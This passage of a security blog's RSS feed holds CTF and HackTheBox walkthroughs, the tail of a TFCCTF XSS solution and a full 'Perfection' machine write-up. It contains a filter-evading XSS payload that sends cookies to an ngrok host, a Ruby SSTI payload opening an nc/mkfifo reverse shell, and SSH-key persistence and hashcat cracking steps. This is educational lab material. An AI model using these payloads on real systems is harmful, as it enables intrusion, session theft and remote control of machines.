+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># Convert `.` character&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#fe8019">=&lt;/span> payload&lt;span style="color:#fe8019">.&lt;/span>replace(&lt;span style="color:#b8bb26">&amp;#34;.&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;&amp;#39;+ String[&amp;#39;fromCharCode&amp;#39;](46) +&amp;#39;&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#fe8019">=&lt;/span> payload&lt;span style="color:#fe8019">.&lt;/span>replace(&lt;span style="color:#b8bb26">&amp;#34;s&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;S&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># &amp;#39;(&amp;#39; and &amp;#39;)&amp;#39; are available in banned variable&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#fe8019">=&lt;/span> payload&lt;span style="color:#fe8019">.&lt;/span>replace(&lt;span style="color:#b8bb26">&amp;#34;(&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;$&lt;/span>&lt;span style="color:#b8bb26">{banned[3]}&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#fe8019">=&lt;/span> payload&lt;span style="color:#fe8019">.&lt;/span>replace(&lt;span style="color:#b8bb26">&amp;#34;)&amp;#34;&lt;/span>, &lt;span style="color:#b8bb26">&amp;#34;$&lt;/span>&lt;span style="color:#b8bb26">{banned[4]}&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">print&lt;/span>(payload)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The final payload will look like this:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>hi&lt;span style="color:#fe8019">&amp;lt;&lt;/span>&lt;span style="color:#b8bb26">/div&amp;gt;&amp;lt;Script&amp;gt;fetch${banned[3]}&amp;#39;http:/&lt;/span>&lt;span style="color:#fe8019">/&lt;/span>&lt;span style="color:#d3869b">0&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;+ String[&amp;#39;&lt;/span>fromCharCode&lt;span style="color:#b8bb26">&amp;#39;]${banned[3]}46${banned[4]} +&amp;#39;&lt;/span>tcp&lt;span style="color:#b8bb26">&amp;#39;+ String[&amp;#39;&lt;/span>fromCharCode&lt;span style="color:#b8bb26">&amp;#39;]${banned[3]}46${banned[4]} +&amp;#39;&lt;/span>&lt;span style="color:#fe8019">in&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;+ String[&amp;#39;&lt;/span>fromCharCode&lt;span style="color:#b8bb26">&amp;#39;]${banned[3]}46${banned[4]} +&amp;#39;&lt;/span>ngrok&lt;span style="color:#b8bb26">&amp;#39;+ String[&amp;#39;&lt;/span>fromCharCode&lt;span style="color:#b8bb26">&amp;#39;]${banned[3]}46${banned[4]} +&amp;#39;&lt;/span>io&lt;span style="color:#fe8019">:&lt;/span>&lt;span style="color:#d3869b">17940&lt;/span>&lt;span style="color:#fe8019">/?&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;+document[&amp;#39;&lt;/span>cookie&amp;#39;]${banned[&lt;span style="color:#d3869b">4&lt;/span>]}&lt;span style="color:#fe8019">&amp;lt;&lt;/span>/Script&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can report this to the bot and it will make a request to our web hook with the cookie:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tfcctf-25/Pasted%20image%2020250903144441.webp">&lt;/figure></content></item><item><title>Perfection | HackTheBox</title><link>https://h4r1337.github.io/posts/perfection/</link><pubDate>Sun, 07 Jul 2024 11:34:41 +0530</pubDate><guid>https://h4r1337.github.io/posts/perfection/</guid><description>&lt;h3 id="overview">Overview&lt;/h3>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/perfection/cover.webp">&lt;/figure>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th style="text-align: center">Title&lt;/th>
+&lt;th style="text-align: center">&lt;a href="https://app.hackthebox.com/machines/Perfection">perfection&lt;/a>&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td style="text-align: center">Difficulty&lt;/td>
+&lt;td style="text-align: center">Easy&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: center">Machine&lt;/td>
+&lt;td style="text-align: center">Linux&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: center">Maker&lt;/td>
+&lt;td style="text-align: center">&lt;a href="https://app.hackthebox.com/users/1412009">&lt;img src="https://www.hackthebox.com/badge/image/1412009" alt="" style="display: unset">&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;br>
+&lt;div class="alert alert-tip collapsed">
+&lt;div class="alert-heading-box" onclick="toggleAlert(this)" >
+&lt;i class="bx bx-bulb">&lt;/i>
+&lt;p class="alert-heading">
+About Perfection
+&lt;/p>
+&lt;i class='bx bx-chevron-down collapsed'>&lt;/i>
+&lt;/div>
+&lt;div class="alert-content" style="display: none;" >
+&lt;p>Perfection is an easy Linux machine that features a web application with functionality to calculate student scores. This application is vulnerable to Server-Side Template Injection (SSTI) via regex filter bypass. A foothold can be gained by exploiting the SSTI vulnerability. Enumerating the user reveals they are part of the &lt;code>sudo&lt;/code> group. Further enumeration uncovers a database with password hashes, and the user&amp;rsquo;s mail reveals a possible password format. Using a mask attack on the hash, the user&amp;rsquo;s password is obtained, which is leveraged to gain &lt;code>root&lt;/code> access.&lt;/p></description><content>&lt;h3 id="overview">Overview&lt;/h3>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/perfection/cover.webp">&lt;/figure>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th style="text-align: center">Title&lt;/th>
+&lt;th style="text-align: center">&lt;a href="https://app.hackthebox.com/machines/Perfection">perfection&lt;/a>&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td style="text-align: center">Difficulty&lt;/td>
+&lt;td style="text-align: center">Easy&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: center">Machine&lt;/td>
+&lt;td style="text-align: center">Linux&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: center">Maker&lt;/td>
+&lt;td style="text-align: center">&lt;a href="https://app.hackthebox.com/users/1412009">&lt;img src="https://www.hackthebox.com/badge/image/1412009" alt="" style="display: unset">&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;br>
+&lt;div class="alert alert-tip collapsed">
+&lt;div class="alert-heading-box" onclick="toggleAlert(this)" >
+&lt;i class="bx bx-bulb">&lt;/i>
+&lt;p class="alert-heading">
+About Perfection
+&lt;/p>
+&lt;i class='bx bx-chevron-down collapsed'>&lt;/i>
+&lt;/div>
+&lt;div class="alert-content" style="display: none;" >
+&lt;p>Perfection is an easy Linux machine that features a web application with functionality to calculate student scores. This application is vulnerable to Server-Side Template Injection (SSTI) via regex filter bypass. A foothold can be gained by exploiting the SSTI vulnerability. Enumerating the user reveals they are part of the &lt;code>sudo&lt;/code> group. Further enumeration uncovers a database with password hashes, and the user&amp;rsquo;s mail reveals a possible password format. Using a mask attack on the hash, the user&amp;rsquo;s password is obtained, which is leveraged to gain &lt;code>root&lt;/code> access.&lt;/p>
+&lt;/div>
+&lt;/div>
+&lt;script>
+function toggleAlert(headerElement) {
+var alertBox = headerElement.parentElement;
+var alertContent = alertBox.querySelector('.alert-content');
+var icon = headerElement.querySelectorAll('i')[1];
+alertBox.classList.toggle('open');
+alertBox.classList.toggle('collapsed');
+if (alertBox.classList.contains('open')) {
+alertContent.style.display = 'block';
+icon.classList.remove('open');
+icon.classList.add('collapsed');
+} else {
+icon.classList.remove('collapsed');
+icon.classList.add('open');
+alertContent.style.display = 'none';
+}
+}
+&lt;/script>
+&lt;h2 id="information-gathering">Information Gathering&lt;/h2>
+&lt;p>Scanned all TCP ports:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>nmap -p- -vv -Pn -T4 --min-rate &lt;span style="color:#d3869b">1000&lt;/span> -oA nmap/ports 10.10.11.253
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#fe8019">for&lt;/span> 10.10.11.253
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up, received user-set &lt;span style="color:#fe8019">(&lt;/span>0.17s latency&lt;span style="color:#fe8019">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanned at 2024-05-03 16:40:54 IST &lt;span style="color:#fe8019">for&lt;/span> 85s
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Not shown: &lt;span style="color:#d3869b">64836&lt;/span> closed ports, &lt;span style="color:#d3869b">697&lt;/span> filtered ports
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Reason: &lt;span style="color:#d3869b">64836&lt;/span> conn-refused and &lt;span style="color:#d3869b">697&lt;/span> no-responses
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE REASON
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh syn-ack
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http syn-ack
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Enumerated open TCP ports:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>nmap -p22,80 -sC -sV --min-rate &lt;span style="color:#d3869b">1000&lt;/span> -Pn -vv -oA nmap/service 10.10.11.253
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#fe8019">for&lt;/span> 10.10.11.253
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up, received user-set &lt;span style="color:#fe8019">(&lt;/span>0.20s latency&lt;span style="color:#fe8019">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanned at 2024-05-03 16:44:53 IST &lt;span style="color:#fe8019">for&lt;/span> 15s
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE REASON VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 &lt;span style="color:#fe8019">(&lt;/span>Ubuntu Linux; protocol 2.0&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http syn-ack nginx
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-methods:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Supported Methods: GET HEAD
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Weighted Grade Calculator
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr>
+&lt;h3 id="port-80---http-webrick-170">Port 80 - HTTP (WEBrick &lt;code>1.7.0&lt;/code>)&lt;/h3>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/perfection/port-80.webp">&lt;/figure>
+&lt;h5 id="weighted-grade">&lt;code>/weighted-grade&lt;/code>&lt;/h5>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/perfection/weighted-grade.webp">&lt;/figure>
+&lt;p>Let&amp;rsquo;s fuzz all these inputs.&lt;/p>
+&lt;hr>
+&lt;h2 id="exploitation">Exploitation&lt;/h2>
+&lt;h3 id="ssti">SSTI&lt;/h3>
+&lt;p>After some trial and error through burp repeater I found that we can enter ruby SSTI
+payloads to exploit this. But the server is blocking malicious inputs - maybe there&amp;rsquo;s
+some regex in the backend stopping our inputs?&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/perfection/ssti.webp">&lt;/figure>
+&lt;p>Entering a new line character &lt;code>%0a&lt;/code> before the payload seems to solve the issue&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/perfection/ssti-bypass.webp">&lt;/figure>
+&lt;p>Now we can use the SSTI to send a rever shell payload to the server to get initial access.
+I used &lt;code>nc - mkfifo&lt;/code> payload for the reverse shell (works almost always).&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ruby" data-lang="ruby">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">&amp;lt;%=&lt;/span> &lt;span style="color:#fabd2f">system&lt;/span>(&lt;span style="color:#b8bb26">&amp;#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&amp;gt;&amp;amp;1|nc 10.10.14.41 1234 &amp;gt;/tmp/f&amp;#39;&lt;/span>) &lt;span style="color:#fe8019">%&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/perfection/shell.webp">&lt;/figure>
+&lt;h2 id="privilege-escalation">Privilege Escalation&lt;/h2>
+&lt;h3 id="local-enumeration">Local Enumeration&lt;/h3>
+&lt;p>I created a ssh key and inserted the public key into &lt;code>/home/susan/.ssh/authorized_keys&lt;/code>. Now we can access an interactive shell through ssh.&lt;/p>
+&lt;p>After some enumeration found this database file:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/perfection/local-enum.webp">&lt;/figure>
+&lt;p>Downloaded the file into my machine using python simple http server and inside the db found these passwords:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/perfection/credentials.webp">&lt;/figure>
+&lt;p>Another important finding: &lt;code>/var/mail/susan&lt;/code>&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/perfection/mail.webp">&lt;/figure>
+&lt;p>We can use this info and &lt;strong>&lt;a href="https://hashcat.net/wiki/doku.php?id=mask_attack">hashcat mask&lt;/a>&lt;/strong> attack to find the password.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>hashcat -m &lt;span style="color:#d3869b">1400&lt;/span> susan.hash -a &lt;span style="color:#d3869b">3&lt;/span> &lt;span style="color:#b8bb26">&amp;#39;susan_nasus_?d?d?d?d?d?d?d?d?d&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/perfection/hashcat.webp">&lt;/figure>
+&lt;h3 id="privilege-escalation-1">Privilege Escalation&lt;/h3>
+&lt;p>That was easy&amp;hellip;&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/perfection/root.webp">&lt;/figure>
+&lt;hr></content></item></channel></rss>
